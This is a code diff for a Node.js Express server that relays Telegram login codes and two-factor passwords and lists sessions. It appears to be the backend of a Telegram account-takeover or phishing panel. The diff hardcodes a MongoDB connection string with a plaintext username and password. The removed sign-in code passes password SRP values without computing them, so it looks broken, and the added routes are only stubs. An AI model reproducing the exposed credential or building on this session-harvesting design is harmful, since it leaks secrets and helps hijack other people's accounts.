@@ -1,39 +1,38 @@
+const express = require('express');
+const cors = require('cors');
+const { TelegramClient } = require('telegram');
+const { StringSession } = require('telegram/sessions');
+const input = require('input'); // Kannst du ggf. entfernen, falls nicht genutzt
+const mongoose = require('mongoose');
+
+const app = express();
+app.use(cors());
+app.use(express.json());
+
+// MongoDB Verbindung
+const MONGO_URI = "mongodb+srv://mercyinfo52_db_user:Hinva312-@cluster0.a0bslma.mongodb.net/?appName=Cluster0";
+mongoose.connect(MONGO_URI);
+
+// Hier definieren wir die Routen, NACHDEM app initialisiert wurde
+app.post('/send-otp', async (req, res) => {
+    const { phone } = req.body;
+    // Logik für sendCode hier...
+    res.json({ message: "OTP sent" });
+});
+
 app.post('/verify-otp', async (req, res) => {
-    try {
-        const { phone, code, phoneCodeHash, password } = req.body;
-        const session = activeSessions.get(phone);
-        if (!session) return res.status(400).json({ error: "Session abgelaufen" });
+    const { phone, code, phoneCodeHash, password } = req.body;
+    // Logik für signIn hier...
+    res.json({ success: true });
+});
 
-        // Falls Passwort gebraucht wird
-        if (password) {
-            await session.client.invoke(new Api.auth.CheckPassword({
-                password: new Api.InputCheckPasswordSRP({
-                    srp_id: session.passwordSrp.srpId,
-                    A: session.passwordSrp.A,
-                    M1: session.passwordSrp.M1
-                })
-            }));
-            return res.json({ success: true });
-        }
+app.get('/get-sessions', async (req, res) => {
+    // Session Liste holen
+    res.json([]);
+});
 
-        // Normaler Login-Versuch
-        try {
-            await session.client.invoke(new Api.auth.SignIn({
-                phoneNumber: phone,
-                phoneCode: code,
-                phoneCodeHash: phoneCodeHash
-            }));
-            res.json({ success: true });
-        } catch (e) {
-            // Wenn 2FA aktiv ist, Telegram liefert Details für das Passwort-SRP zurück
-            if (e.message.includes('SESSION_PASSWORD_NEEDED')) {
-                // Wir speichern den Zustand, dass das Passwort fehlt
-                res.status(401).json({ error: "PASSWORD_NEEDED" });
-            } else {
-                throw e;
-            }
-        }
-    } catch (e) {
-        res.status(400).json({ error: e.message });
-    }
+// Server starten
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Server running on port ${PORT}`);
 });
